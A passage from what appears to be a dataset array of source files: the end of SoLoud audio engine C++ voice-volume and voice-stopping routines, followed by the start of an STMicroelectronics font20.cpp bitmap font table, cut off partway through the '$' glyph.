(mVoice[aVoice]->mChannels == 4)\n\t\t\t{\n\t\t\t\tmVoice[aVoice]->mChannelVolume[2] = l;\n\t\t\t\tmVoice[aVoice]->mChannelVolume[3] = r;\n\t\t\t}\n\t\t\tif (mVoice[aVoice]->mChannels == 6)\n\t\t\t{\n\t\t\t\tmVoice[aVoice]->mChannelVolume[2] = 1.0f / (float)sqrt(2.0f);\n\t\t\t\tmVoice[aVoice]->mChannelVolume[3] = 1;\n\t\t\t\tmVoice[aVoice]->mChannelVolume[4] = l;\n\t\t\t\tmVoice[aVoice]->mChannelVolume[5] = r;\n\t\t\t}\n\t\t\tif (mVoice[aVoice]->mChannels == 8)\n\t\t\t{\n\t\t\t\tmVoice[aVoice]->mChannelVolume[2] = 1.0f / (float)sqrt(2.0f);\n\t\t\t\tmVoice[aVoice]->mChannelVolume[3] = 1;\n\t\t\t\tmVoice[aVoice]->mChannelVolume[4] = l;\n\t\t\t\tmVoice[aVoice]->mChannelVolume[5] = r;\n\t\t\t\tmVoice[aVoice]->mChannelVolume[6] = l;\n\t\t\t\tmVoice[aVoice]->mChannelVolume[7] = r;\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid Soloud::setVoiceVolume_internal(unsigned int aVoice, float aVolume)\n\t{\n\t\tSOLOUD_ASSERT(aVoice < VOICE_COUNT);\n\t\tSOLOUD_ASSERT(mInsideAudioThreadMutex);\n\t\tmActiveVoiceDirty = true;\n\t\tif (mVoice[aVoice])\n\t\t{\n\t\t\tmVoice[aVoice]->mSetVolume = aVolume;\n\t\t\tupdateVoiceVolume_internal(aVoice);\n\t\t}\n\t}\n\n\tvoid Soloud::stopVoice_internal(unsigned int aVoice)\n\t{\n\t\tSOLOUD_ASSERT(aVoice < VOICE_COUNT);\n\t\tSOLOUD_ASSERT(mInsideAudioThreadMutex);\n\t\tmActiveVoiceDirty = true;\n\t\tif (mVoice[aVoice])\n\t\t{\n\t\t\t// Delete via temporary variable to avoid recursion\n\t\t\tAudioSourceInstance * v = mVoice[aVoice];\n\t\t\tmVoice[aVoice] = 0;\n\n\t\t\tunsigned int i;\n\t\t\tfor (i = 0; i < mMaxActiveVoices; i++)\n\t\t\t{\n\t\t\t\tif (mResampleDataOwner[i] == v)\n\t\t\t\t{\n\t\t\t\t\tmResampleDataOwner[i] = NULL;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tdelete v;\n\t\t}\n\t}\n\n\tvoid Soloud::updateVoiceRelativePlaySpeed_internal(unsigned int aVoice)\n\t{\n\t\tSOLOUD_ASSERT(aVoice < VOICE_COUNT);\n\t\tSOLOUD_ASSERT(mInsideAudioThreadMutex);\n\t\tmVoice[aVoice]->mOverallRelativePlaySpeed = m3dData[aVoice].mDopplerValue * mVoice[aVoice]->mSetRelativePlaySpeed;\n\t\tmVoice[aVoice]->mSamplerate = mVoice[aVoice]->mBaseSamplerate * mVoice[aVoice]->mOverallRelativePlaySpeed;\n\t}\n\n\tvoid Soloud::updateVoiceVolume_internal(unsigned int aVoice)\n\t{\n\t\tSOLOUD_ASSERT(aVoice < VOICE_COUNT);\n\t\tSOLOUD_ASSERT(mInsideAudioThreadMutex);\n\t\tmVoice[aVoice]->mOverallVolume = mVoice[aVoice]->mSetVolume * m3dData[aVoice].m3dVolume;\n\t\tif (mVoice[aVoice]->mFlags & AudioSourceInstance::PAUSED)\n\t\t{\n\t\t\tint i;\n\t\t\tfor (i = 0; i < MAX_CHANNELS; i++)\n\t\t\t{\n\t\t\t\tmVoice[aVoice]->mCurrentChannelVolume[i] = mVoice[aVoice]->mChannelVolume[i] * mVoice[aVoice]->mOverallVolume;\n\t\t\t}\n\t\t}\n\t}\n}\n",
    "/**\n  ******************************************************************************\n  * @file    font20.cpp\n  * @author  MCD Application Team\n  * @version V1.0.0\n  * @date    18-February-2014\n  * @brief   This file provides text font20. \n  ******************************************************************************\n  * @attention\n  *\n  * <h2><center>&copy; COPYRIGHT(c) 2014 STMicroelectronics</center></h2>\n  *\n  * Redistribution and use in source and binary forms, with or without modification,\n  * are permitted provided that the following conditions are met:\n  *   1. Redistributions of source code must retain the above copyright notice,\n  *      this list of conditions and the following disclaimer.\n  *   2. Redistributions in binary form must reproduce the above copyright notice,\n  *      this list of conditions and the following disclaimer in the documentation\n  *      and/or other materials provided with the distribution.\n  *   3. Neither the name of STMicroelectronics nor the names of its contributors\n  *      may be used to endorse or promote products derived from this software\n  *      without specific prior written permission.\n  *\n  * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n  * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n  * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n  * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n  * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n  * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n  * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n  * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n  * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n  * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n  *\n  ******************************************************************************\n  */\n\n/* Includes ------------------------------------------------------------------*/\n#include \"fonts.h\"\n#include <avr/pgmspace.h>\n\n// Character bitmaps for Courier New 15pt\nconst uint8_t Font20_Table[] PROGMEM = \n{\n\t// @0 ' ' (14 pixels wide)\n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\n\t// @40 '!' (14 pixels wide)\n\t0x00, 0x00, //               \n\t0x07, 0x00, //      ###      \n\t0x07, 0x00, //      ###      \n\t0x07, 0x00, //      ###      \n\t0x07, 0x00, //      ###      \n\t0x07, 0x00, //      ###      \n\t0x07, 0x00, //      ###      \n\t0x07, 0x00, //      ###      \n\t0x02, 0x00, //       #       \n\t0x02, 0x00, //       #       \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x07, 0x00, //      ###      \n\t0x07, 0x00, //      ###      \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\n\t// @80 '\"' (14 pixels wide)\n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x1C, 0xE0, //    ###  ###   \n\t0x1C, 0xE0, //    ###  ###   \n\t0x1C, 0xE0, //    ###  ###   \n\t0x08, 0x40, //     #    #    \n\t0x08, 0x40, //     #    #    \n\t0x08, 0x40, //     #    #    \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\n\t// @120 '#' (14 pixels wide)\n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x3F, 0xF0, //   ##########  \n\t0x3F, 0xF0, //   ##########  \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x3F, 0xF0, //   ##########  \n\t0x3F, 0xF0, //   ##########  \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x0C, 0xC0, //     ##  ##    \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\t0x00, 0x00, //               \n\n\t// @160 '$' (14 pixels wide)\n\t0x03, 0x00, //       ##      \n\t0x03, 0x00, //       ##      \n\t0x07, 0xE0, //      ######   \n\t0x0F, 0xE0, //     #"
]